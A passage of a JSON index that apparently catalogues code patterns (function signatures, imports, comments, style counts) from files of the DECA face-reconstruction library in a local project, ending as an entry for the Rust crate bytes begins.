        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/rotation_converter.py",
        "docstrings": [],
        "function_defs": [
          "def rad2deg(tensor):\n\"\"\"Function that converts angles from radians to degrees.\n\nSee :class:`~torchgeometry.RadToDeg` for details.\n\nArgs:\ntensor (Tensor): Tensor of arbitrary shape.\n\nReturns:\nTensor: Tensor with same shape as input.",
          "def deg2rad(tensor):\n\"\"\"Function that converts angles from degrees to radians.\n\nSee :class:`~torchgeometry.DegToRad` for details.\n\nArgs:\ntensor (Tensor): Tensor of arbitrary shape.\n\nReturns:\nTensor: Tensor with same shape as input.",
          "def euler_to_quaternion(r):",
          "def rotation_matrix_to_quaternion(rotation_matrix, eps=1e-6):\n\"\"\"Convert 3x4 rotation matrix to 4d quaternion vector\n\nThis algorithm is based on algorithm described in\nhttps://github.com/KieranWynn/pyquaternion/blob/master/pyquaternion/quaternion.py#L201\n\nArgs:\nrotation_matrix (Tensor): the rotation matrix to convert.\n\nReturn:",
          "def angle_axis_to_quaternion(angle_axis: torch.Tensor) -> torch.Tensor:\n\"\"\"Convert an angle axis to a quaternion.\n\nAdapted from ceres C++ library: ceres-solver/include/ceres/rotation.h\n\nArgs:\nangle_axis (torch.Tensor): tensor with angle axis.\n\nReturn:\ntorch.Tensor: tensor with quaternion.",
          "def quaternion_to_rotation_matrix(quat):\n\"\"\"Convert quaternion coefficients to rotation matrix.\nArgs:\nquat: size = [B, 4] 4 <===>(w, x, y, z)\nReturns:\nRotation matrix corresponding to the quaternion -- size = [B, 3, 3]\n\"\"\"",
          "def quaternion_to_angle_axis(quaternion: torch.Tensor):\n\"\"\"Convert quaternion vector to angle axis of rotation. TODO: CORRECT\n\nAdapted from ceres C++ library: ceres-solver/include/ceres/rotation.h\n\nArgs:\nquaternion (torch.Tensor): tensor with quaternions.\n\nReturn:\ntorch.Tensor: tensor with angle axis of rotation.",
          "def batch_euler2axis(r):",
          "def batch_euler2matrix(r):",
          "def batch_matrix2euler(rot_mats):",
          "def batch_matrix2axis(rot_mats):",
          "def batch_axis2matrix(theta):",
          "def batch_axis2euler(theta):",
          "def batch_axis2euler(r):",
          "def batch_orth_proj(X, camera):",
          "def batch_rodrigues(rot_vecs, epsilon=1e-8, dtype=torch.float32):"
        ],
        "class_defs": [],
        "imports": [
          "import torch"
        ],
        "comments": [
          "# \"angle_axis_to_rotation_matrix\", batch_rodrigues",
          "# \"angle_axis_to_quaternion\",",
          "#",
          "######### to quaternion",
          "# if not rotation_matrix.shape[-2:] == (3, 4):",
          "#     raise ValueError(",
          "#         \"Input size must be a N x 3 x 4  tensor. Got {}\".format(",
          "#             rotation_matrix.shape))",
          "# def angle_axis_to_quaternion(theta):",
          "#     batch_size = theta.shape[0]",
          "#     l1norm = torch.norm(theta + 1e-8, p=2, dim=1)",
          "#     angle = torch.unsqueeze(l1norm, -1)",
          "#     normalized = torch.div(theta, angle)",
          "#     angle = angle * 0.5",
          "#     v_cos = torch.cos(angle)",
          "#     v_sin = torch.sin(angle)",
          "#     quat = torch.cat([v_cos, v_sin * normalized], dim=1)",
          "#     return quat",
          "# unpack input and compute conversion",
          "#### quaternion to",
          "# unpack input and compute conversion",
          "#### batch converter",
          "# Calculates rotation matrix to euler angles",
          "# Careful for extreme cases of eular angles like [0.0, pi, 0.0]",
          "### only y?",
          "# TODO:",
          "# angle axis to rotation matrix",
          "# theta N x 3",
          "# return quat2mat(quat)",
          "# batch_rodrigues",
          "# Bx1 arrays"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 8,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/tensor_cropper.py",
        "docstrings": [],
        "function_defs": [
          "def points2bbox(points, points_scale=None):",
          "def augment_bbox(center, bbox_size, scale=[1.0, 1.0], trans_scale=0.):",
          "def crop_tensor(image, center, bbox_size, crop_size, interpolation = 'bilinear', align_corners=False):",
          "def __init__(self, crop_size, scale=[1,1], trans_scale = 0.):",
          "def crop(self, image, points, points_scale=None):",
          "def transform_points(self, points, tform, points_scale=None, normalize = True):",
          "def transform_points(points, tform, points_scale=None, out_scale=None):"
        ],
        "class_defs": [
          "class Cropper(object):"
        ],
        "imports": [
          "import torch",
          "from kornia.geometry.transform.imgwarp import ("
        ],
        "comments": [
          "# Convert the bounding box to a square box",
          "# points: top-left, top-right, bottom-right, bottom-left",
          "# estimate transformation between points",
          "# simulate broadcasting",
          "# dst_trans_src = dst_trans_src.expand(batch_size, -1, -1)",
          "# warp images",
          "# tform = torch.inverse(dst_trans_src)",
          "# points to bbox",
          "# argument bbox. TODO: add rotation?",
          "# crop",
          "#'input points must use original range'",
          "#'input points must use original range'",
          "# import ipdb; ipdb.set_trace()"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/lossfunc.py",
        "docstrings": [],
        "function_defs": [
          "def l2_distance(verts1, verts2):",
          "def kl_loss(texcode):\n\"\"\"\nrecon_x: generating images\nx: origin images\nmu: latent mean\nlogvar: latent log variance\n\"\"\"",
          "def shading_white_loss(shading):",
          "def shading_smooth_loss(shading):",
          "def albedo_constancy_loss(albedo, alpha = 15, weight = 1.):",
          "def albedo_ring_loss(texcode, ring_elements, margin, weight=1.):\n\"\"\"\ncomputes ring loss for ring_outputs before FLAME decoder\nInputs:\nring_outputs = a list containing N streams of the ring; len(ring_outputs) = N\nEach ring_outputs[i] is a tensor of (batch_size X shape_dim_num)\nAim is to force each row (same subject) of each stream to produce same shape\nEach row of first N-1 strams are of the same subject and\nthe Nth stream is the different subject\n\"\"\"",
          "def albedo_same_loss(albedo, ring_elements, weight=1.):\n\"\"\"\ncomputes ring loss for ring_outputs before FLAME decoder\nInputs:\nring_outputs = a list containing N streams of the ring; len(ring_outputs) = N\nEach ring_outputs[i] is a tensor of (batch_size X shape_dim_num)\nAim is to force each row (same subject) of each stream to produce same shape\nEach row of first N-1 strams are of the same subject and\nthe Nth stream is the different subject\n\"\"\"",
          "def batch_kp_2d_l1_loss(real_2d_kp, predicted_2d_kp, weights=None):\n\"\"\"\nComputes the l1 loss between the ground truth keypoints and the predicted keypoints\nInputs:\nkp_gt  : N x K x 3\nkp_pred: N x K x 2\n\"\"\"",
          "def landmark_loss(predicted_landmarks, landmarks_gt, weight=1.):",
          "def eye_dis(landmarks):",
          "def eyed_loss(predicted_landmarks, landmarks_gt, weight=1.):",
          "def lip_dis(landmarks):",
          "def lipd_loss(predicted_landmarks, landmarks_gt, weight=1.):",
          "def weighted_landmark_loss(predicted_landmarks, landmarks_gt, weight=1.):",
          "def landmark_loss_tensor(predicted_landmarks, landmarks_gt, weight=1.):",
          "def ring_loss(ring_outputs, ring_type, margin, weight=1.):\n\"\"\"\ncomputes ring loss for ring_outputs before FLAME decoder\nInputs:\nring_outputs = a list containing N streams of the ring; len(ring_outputs) = N\nEach ring_outputs[i] is a tensor of (batch_size X shape_dim_num)\nAim is to force each row (same subject) of each stream to produce same shape\nEach row of first N-1 strams are of the same subject and\nthe Nth stream is the different subject\n\"\"\"",
          "def gradient_dif_loss(prediction, gt):",
          "def get_laplacian_kernel2d(kernel_size: int):\nr\"\"\"Function that returns Gaussian filter matrix coefficients.\n\nArgs:\nkernel_size (int): filter size should be odd.\n\nReturns:\nTensor: 2D tensor with laplacian filter matrix coefficients.\n\nShape:",
          "def laplacian_hq_loss(prediction, gt):",
          "def __init__(self):",
          "def forward(self, x):",
          "def __init__(self, featlayer=VGG19FeatLayer):",
          "def sum_normalize(self, featmaps):",
          "def patch_extraction(self, featmaps):",
          "def compute_relative_distances(self, cdist):",
          "def exp_norm_relative_dist(self, relative_dist):",
          "def mrf_loss(self, gen, tar):",
          "def forward(self, gen, tar):",
          "def __init__(self):\n\"\"\"\nConstructor\n\"\"\"",
          "def load_weights(self, path=\"pretrained/VGG_FACE.t7\"):\n\"\"\" Function to load luatorch pretrained\nArgs:\npath: path for the luatorch pretrained\n\"\"\"",
          "def forward(self, x):\n\"\"\" Pytorch forward\nArgs:\nx: input image (224x224)\nReturns: class logits\n\"\"\"",
          "def __init__(self):",
          "def sum_normalize(self, featmaps):",
          "def patch_extraction(self, featmaps):",
          "def compute_relative_distances(self, cdist):",
          "def exp_norm_relative_dist(self, relative_dist):",
          "def mrf_loss(self, gen, tar):",
          "def forward(self, gen, tar):",
          "def __init__(self, pretrained_model, pretrained_data='vggface2'):",
          "def reg_features(self, x):",
          "def transform(self, img):",
          "def _cos_metric(self, x1, x2):",
          "def forward(self, gen, tar, is_crop=True):"
        ],
        "class_defs": [
          "class VGG19FeatLayer(nn.Module):",
          "class IDMRFLoss(nn.Module):",
          "class VGG_16(nn.Module):",
          "class VGGLoss(nn.Module):",
          "class VGGFace2Loss(nn.Module):"
        ],
        "imports": [
          "import torch.nn as nn",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "import torch.autograd as autograd",
          "from functools import reduce",
          "import torchvision.models as models",
          "import cv2",
          "import torchfile",
          "from torch.autograd import Variable",
          "from . import util",
          "from ..models.frnet import resnet50, load_state_dict"
        ],
        "comments": [
          "### VAE",
          "# KL divergence",
          "### ------------------------------------- Losses/Regularizations for shading",
          "# white shading",
          "# uv_mask_tf = tf.expand_dims(tf.expand_dims(tf.constant( self.uv_mask, dtype = tf.float32 ), 0), -1)",
          "# mean_shade = tf.reduce_mean( tf.multiply(shade_300W, uv_mask_tf) , axis=[0,1,2]) * 16384 / 10379",
          "# G_loss_white_shading = 10*norm_loss(mean_shade,  0.99*tf.ones([1, 3], dtype=tf.float32), loss_type = \"l2\")",
          "# rgb_diff = (shading[:,0] - shading[:,1])**2 + (shading[:,0] - shading[:,2])**2 + (shading[:,1] - shading[:,2])**2",
          "# rgb_diff = (shading[:,0].mean([1,2]) - shading[:,1].mean([1,2]))**2 + (shading[:,0].mean([1,2]) - shading[:,2].mean([1,2]))**2 + (shading[:,1].mean([1,2]) - shading[:,2].mean([1,2]))**2",
          "# rgb_diff = (shading.mean([2, 3]) - torch.ones((shading.shape[0], 3)).float().cuda())**2",
          "### ------------------------------------- Losses/Regularizations for albedo",
          "# texture_300W_labels_chromaticity = (texture_300W_labels + 1.0)/2.0",
          "# texture_300W_labels_chromaticity = tf.divide(texture_300W_labels_chromaticity, tf.reduce_sum(texture_300W_labels_chromaticity, axis=[-1], keep_dims=True) + 1e-6)",
          "# w_u = tf.stop_gradient(tf.exp(-15*tf.norm( texture_300W_labels_chromaticity[:, :-1, :, :] - texture_300W_labels_chromaticity[:, 1:, :, :], ord='euclidean', axis=-1, keep_dims=True)) * texture_vis_mask[:, :-1, :, :] )",
          "# G_loss_local_albedo_const_u = tf.reduce_mean(norm_loss( albedo_300W[:, :-1, :, :], albedo_300W[:, 1:, :, :], loss_type = 'l2,1', reduce_mean=False, p=0.8) * w_u) / tf.reduce_sum(w_u+1e-6)",
          "# w_v = tf.stop_gradient(tf.exp(-15*tf.norm( texture_300W_labels_chromaticity[:, :, :-1, :] - texture_300W_labels_chromaticity[:, :, 1:, :], ord='euclidean', axis=-1, keep_dims=True)) * texture_vis_mask[:, :, :-1, :] )",
          "# G_loss_local_albedo_const_v = tf.reduce_mean(norm_loss( albedo_300W[:, :, :-1, :], albedo_300W[:, :, 1:, :],  loss_type = 'l2,1', reduce_mean=False, p=0.8) * w_v) / tf.reduce_sum(w_v+1e-6)",
          "# G_loss_local_albedo_const = (G_loss_local_albedo_const_u + G_loss_local_albedo_const_v)*10",
          "### ------------------------------------- Losses/Regularizations for vertices",
          "# (predicted_theta, predicted_verts, predicted_landmarks) = ringnet_outputs[-1]",
          "# real_2d = torch.cat(landmarks_gt).cuda()",
          "# left eye:  [38,42], [39,41] - 1",
          "# right eye: [44,48], [45,47] -1",
          "# up inner lip:  [62, 63, 64] - 1",
          "# down innder lip: [68, 67, 66] -1",
          "#smaller inner landmark weights",
          "# (predicted_theta, predicted_verts, predicted_landmarks) = ringnet_outputs[-1]",
          "# import ipdb; ipdb.set_trace()",
          "# nose points",
          "# inner mouth",
          "# (predicted_theta, predicted_verts, predicted_landmarks) = ringnet_outputs[-1]",
          "######################################## images/features/perceptual",
          "# https://torchgeometry.readthedocs.io/en/latest/_modules/kornia/filters/laplacian.html",
          "##",
          "# print([x for x in out])",
          "## gen: [bz,3,h,w] rgb [0,1]",
          "# loss = 0",
          "# for key in self.feat_style_layers.keys():",
          "#     loss += torch.mean((gen_vgg_feats[key] - tar_vgg_feats[key])**2)",
          "# return loss",
          "######################################################## vgg16 face",
          "# self.mean = torch.tensor([0.485, 0.456, 0.406]).view(1, 3, 1, 1).cuda()",
          "## gen: [bz,3,h,w] rgb [0,1]",
          "# loss = 0",
          "# for key in self.feat_style_layers.keys():",
          "#     loss += torch.mean((gen_vgg_feats[key] - tar_vgg_feats[key])**2)",
          "# return loss",
          "##############################################",
          "## ref: https://github.com/cydonia999/VGGFace2-pytorch",
          "# out = []",
          "# x = F.interpolate(x*2. - 1., [224,224], mode='nearest')",
          "# import ipdb; ipdb.set_trace()",
          "# import ipdb;ipdb.set_trace()",
          "# loss = ((gen_out - tar_out)**2).mean()"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 5,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/trainer.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, model, config=None, device='cuda:0'):",
          "def configure_optimizers(self):",
          "def load_checkpoint(self):",
          "def training_step(self, batch, batch_nb):",
          "def validation_step(self):",
          "def evaluate(self):",
          "def prepare_data(self):",
          "def fit(self):"
        ],
        "class_defs": [
          "class Trainer(object):"
        ],
        "imports": [
          "import os, sys",
          "import torch",
          "import torchvision",
          "import torch.nn.functional as F",
          "import torch.nn as nn",
          "from torch.utils.data import DataLoader",
          "import numpy as np",
          "from time import time",
          "from skimage.io import imread",
          "import cv2",
          "import pickle",
          "from loguru import logger",
          "from datetime import datetime",
          "from tqdm import tqdm",
          "from .utils.renderer import SRenderY",
          "from .models.encoders import ResnetEncoder",
          "from .models.FLAME import FLAME, FLAMETex",
          "from .models.decoders import Generator",
          "from .utils import util",
          "from .utils.rotation_converter import batch_euler2axis",
          "from .datasets import datasets",
          "from .utils.config import cfg",
          "from .utils import lossfunc",
          "from .datasets import build_datasets",
          "from torch.utils.tensorboard import SummaryWriter",
          "from .datasets.now import NoWDataset #, NoWVal_old",
          "import ipdb; ipdb.set_trace()"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# deca model",
          "# initialize loss",
          "# intizalize loggers",
          "# resume training, including model weight, opt, steps",
          "# load model weights only",
          "# [B, K, 3, size, size] ==> [BxK, 3, size, size]",
          "#-- encoder",
          "### shape constraints",
          "## append gt",
          "# import ipdb; ipdb.set_trace()",
          "#-- decoder",
          "#------ rendering",
          "# mask",
          "# images",
          "#### ----------------------- Losses",
          "############################# base shape",
          "# reg on jaw pose",
          "#########################################################",
          "# losses_key = ['landmark', 'shape_reg', 'expression_reg']",
          "# run now validation images",
          "#-- save results for evaluation",
          "# save mesh",
          "# save 7 landmarks for alignment",
          "# visualize results to check",
          "# exit()",
          "## then please run main.py in https://github.com/soubhiksanyal/now_evaluation, it will take around 0.5h to get the metric results",
          "# import ipdb; ipdb.set_trace()"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/frnet.py",
        "docstrings": [],
        "function_defs": [
          "def conv3x3(in_planes, out_planes, stride=1):\n\"\"\"3x3 convolution with padding\"\"\"\nreturn nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride,\npadding=1, bias=False)\n\nclass BasicBlock(nn.Module):\nexpansion = 1\n\ndef __init__(self, inplanes, planes, stride=1, downsample=None):\nsuper(BasicBlock, self).__init__()",
          "def __init__(self, inplanes, planes, stride=1, downsample=None):",
          "def forward(self, x):",
          "def __init__(self, inplanes, planes, stride=1, downsample=None):",
          "def forward(self, x):",
          "def __init__(self, block, layers, num_classes=1000, include_top=True):",
          "def _make_layer(self, block, planes, blocks, stride=1):",
          "def forward(self, x):",
          "def resnet50(**kwargs):\n\"\"\"Constructs a ResNet-50 model.\n\"\"\"",
          "def load_state_dict(model, fname):\n\"\"\"\nSet parameters converted from Caffe models authors of VGGFace2 provide.\nSee https://www.robots.ox.ac.uk/~vgg/data/vgg_face2/.\nArguments:\nmodel: model\nfname: file name of parameters converted from a Caffe model, assuming the file format is Pickle.\n\"\"\""
        ],
        "class_defs": [
          "class BasicBlock(nn.Module):",
          "class Bottleneck(nn.Module):",
          "class ResNet(nn.Module):"
        ],
        "imports": [
          "import torch.nn as nn",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "import cv2",
          "from torch.autograd import Variable",
          "import math",
          "import pickle"
        ],
        "comments": [
          "# from pro_gan_pytorch.PRO_GAN import ProGAN, Generator, Discriminator"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/decoders.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, latent_dim=100, out_channels=1, out_scale=0.01, sample_mode = 'bilinear'):",
          "def forward(self, noise):"
        ],
        "class_defs": [
          "class Generator(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn as nn"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/lbs.py",
        "docstrings": [],
        "function_defs": [
          "def rot_mat_to_euler(rot_mats):",
          "def find_dynamic_lmk_idx_and_bcoords(vertices, pose, dynamic_lmk_faces_idx,",
          "def vertices2landmarks(vertices, faces, lmk_faces_idx, lmk_bary_coords):",
          "def lbs(betas, pose, v_template, shapedirs, posedirs, J_regressor, parents,",
          "def vertices2joints(J_regressor, vertices):",
          "def blend_shapes(betas, shape_disps):",
          "def batch_rodrigues(rot_vecs, epsilon=1e-8, dtype=torch.float32):",
          "def transform_mat(R, t):",
          "def batch_rigid_transform(rot_mats, joints, parents, dtype=torch.float32):\n\"\"\"\nApplies a batch of rigid transformations to the joints\n\nParameters\n----------\nrot_mats : torch.tensor BxNx3x3\nTensor of rotation matrices\njoints : torch.tensor BxNx3\nLocations of joints"
        ],
        "class_defs": [],
        "imports": [
          "from __future__ import absolute_import",
          "from __future__ import print_function",
          "from __future__ import division",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# You can only use this computer program if you have closed",
          "# a license agreement with MPG or you get the right to use the computer",
          "# program from someone who is authorized to grant you that right.",
          "# Any use of the computer program without a valid license is prohibited and",
          "# liable to prosecution.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# Contact: ps-license@tuebingen.mpg.de",
          "# Calculates rotation matrix to euler angles",
          "# Careful for extreme cases of eular angles like [0.0, pi, 0.0]",
          "# Extract the indices of the vertices for each face",
          "# BxLx3",
          "# Add shape contribution",
          "# Get the joints",
          "# NxJx3 array",
          "# 3. Add pose blend shapes",
          "# N x J x 3 x 3",
          "# (N x P) x (P, V * 3) -> N x V x 3",
          "# 4. Get the global joint location",
          "# 5. Do skinning:",
          "# W is N x V x (J + 1)",
          "# (N x V x (J + 1)) x (N x (J + 1) x 16)",
          "# Displacement[b, m, k] = sum_{l} betas[b, l] * shape_disps[m, k, l]",
          "# i.e. Multiply each shape displacement by its corresponding beta and",
          "# then sum them.",
          "# Bx1 arrays",
          "# No padding left or right, only add an extra row",
          "# transforms_mat = transform_mat(",
          "#     rot_mats.view(-1, 3, 3),",
          "#     rel_joints.view(-1, 3, 1)).view(-1, joints.shape[1], 4, 4)",
          "# Subtract the joint location at the rest pose",
          "# No need for rotation, since it's identity when at rest",
          "# The last column of the transformations contains the posed joints",
          "# The last column of the transformations contains the posed joints"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/encoders.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, outsize, last_op=None):",
          "def forward(self, inputs):"
        ],
        "class_defs": [
          "class ResnetEncoder(nn.Module):"
        ],
        "imports": [
          "import numpy as np",
          "import torch.nn as nn",
          "import torch",
          "import torch.nn.functional as F",
          "from . import resnet"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "### regressor"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/resnet.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, block, layers, num_classes=1000):",
          "def _make_layer(self, block, planes, blocks, stride=1):",
          "def forward(self, x):",
          "def __init__(self, inplanes, planes, stride=1, downsample=None):",
          "def forward(self, x):",
          "def conv3x3(in_planes, out_planes, stride=1):\n\"\"\"3x3 convolution with padding\"\"\"\nreturn nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride,\npadding=1, bias=False)\n\nclass BasicBlock(nn.Module):\nexpansion = 1\n\ndef __init__(self, inplanes, planes, stride=1, downsample=None):\nsuper(BasicBlock, self).__init__()",
          "def __init__(self, inplanes, planes, stride=1, downsample=None):",
          "def forward(self, x):",
          "def copy_parameter_from_resnet(model, resnet_dict):",
          "def load_ResNet50Model():",
          "def load_ResNet101Model():",
          "def load_ResNet152Model():",
          "def __init__(self, in_channels, out_channels):",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels):",
          "def forward(self, x):",
          "def __init__(self, in_channels, out_channels, bilinear=True):",
          "def forward(self, x1, x2):",
          "def __init__(self, in_channels, out_channels):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class ResNet(nn.Module):",
          "class Bottleneck(nn.Module):",
          "class BasicBlock(nn.Module):",
          "class DoubleConv(nn.Module):",
          "class Down(nn.Module):",
          "class Up(nn.Module):",
          "class OutConv(nn.Module):"
        ],
        "imports": [
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import torch",
          "from torch.nn.parameter import Parameter",
          "import torch.optim as optim",
          "import numpy as np",
          "import math",
          "import torchvision"
        ],
        "comments": [
          "# self.fc = nn.Linear(512 * block.expansion, num_classes)",
          "# x = self.fc(x)",
          "## x2: [bz, 2048] for shape",
          "## x1: [bz, 2048, 7, 7] for texture",
          "# import ipdb; ipdb.set_trace()",
          "# print(name, ' not available in reconstructed resnet')",
          "# print(name, ' is inconsistent!')",
          "# print('copy resnet state dict finished!')",
          "# import ipdb; ipdb.set_trace()",
          "# model.load_state_dict(checkpoint['model_state_dict'])",
          "######## Unet",
          "# if bilinear, use the normal convolutions to reduce the number of channels",
          "# input is CHW",
          "# if you have padding issues, see",
          "# https://github.com/HaiyongJiang/U-Net-Pytorch-Unstructured-Buggy/commit/0e854509c2cea854e247a9c615f175f76fbb2e3a",
          "# https://github.com/xiaopeng-liao/Pytorch-UNet/commit/8ebac70e633bac59fc22bb5195e513d5832fb3bd"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/models/FLAME.py",
        "docstrings": [],
        "function_defs": [
          "def to_tensor(array, dtype=torch.float32):",
          "def to_np(array, dtype=np.float32):",
          "def __init__(self, **kwargs):",
          "def __init__(self, config):",
          "def _find_dynamic_lmk_idx_and_bcoords(self, pose, dynamic_lmk_faces_idx,",
          "def _vertices2landmarks(self, vertices, faces, lmk_faces_idx, lmk_bary_coords):\n\"\"\"\nCalculates landmarks by barycentric interpolation\nInput:\nvertices: torch.tensor NxVx3, dtype = torch.float32\nThe tensor of input vertices\nfaces: torch.tensor (N*F)x3, dtype = torch.long\nThe faces of the mesh\nlmk_faces_idx: torch.tensor N X L, dtype = torch.long\nThe tensor with the indices of the faces used to calculate the",
          "def seletec_3d68(self, vertices):",
          "def forward(self, shape_params=None, expression_params=None, pose_params=None, eye_pose_params=None):\n\"\"\"\nInput:\nshape_params: N X number of shape parameters\nexpression_params: N X number of expression parameters\npose_params: N X number of pose parameters (6)\nreturn:d\nvertices: N X V X 3\nlandmarks: N X number of landmarks X 3\n\"\"\"",
          "def __init__(self, config):",
          "def forward(self, texcode):"
        ],
        "class_defs": [
          "class Struct(object):",
          "class FLAME(nn.Module):",
          "class FLAMETex(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn as nn",
          "import numpy as np",
          "import pickle",
          "import torch.nn.functional as F",
          "from .lbs import lbs, batch_rodrigues, vertices2landmarks, rot_mat_to_euler"
        ],
        "comments": [
          "# -*- coding: utf-8 -*-",
          "#",
          "# Max-Planck-Gesellschaft zur F\u00f6rderung der Wissenschaften e.V. (MPG) is",
          "# holder of all proprietary rights on this computer program.",
          "# Using this computer program means that you agree to the terms",
          "# in the LICENSE file included with this software distribution.",
          "# Any use not explicitly granted by the LICENSE is prohibited.",
          "#",
          "# Copyright\u00a92019 Max-Planck-Gesellschaft zur F\u00f6rderung",
          "# der Wissenschaften e.V. (MPG). acting on behalf of its Max Planck Institute",
          "# for Intelligent Systems. All rights reserved.",
          "#",
          "# For comments or questions, please email us at deca@tue.mpg.de",
          "# For commercial licensing contact, please contact ps-license@tuebingen.mpg.de",
          "# The vertices of the template model",
          "# The shape components and expression",
          "# The pose components",
          "#",
          "# Fixing Eyeball and neck rotation",
          "# Static and Dynamic Landmark embeddings for FLAME",
          "# Extract the indices of the vertices for each face",
          "# NxLx3"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/rasterizer/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/DECA/decalib/utils/rasterizer/setup.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from setuptools import setup",
          "from torch.utils.cpp_extension import BuildExtension, CUDAExtension",
          "import os"
        ],
        "comments": [
          "# To install, run",
          "# python setup.py build_ext -i",
          "# Ref: https://github.com/pytorch/pytorch/blob/11a40410e755b1fe74efe9eaa635e7ba5712846b/test/cpp_extensions/setup.py#L62",
          "# USE_NINJA = os.getenv('USE_NINJA') == '1'"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.10.1",
    "name": "bytes-1.10.1",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
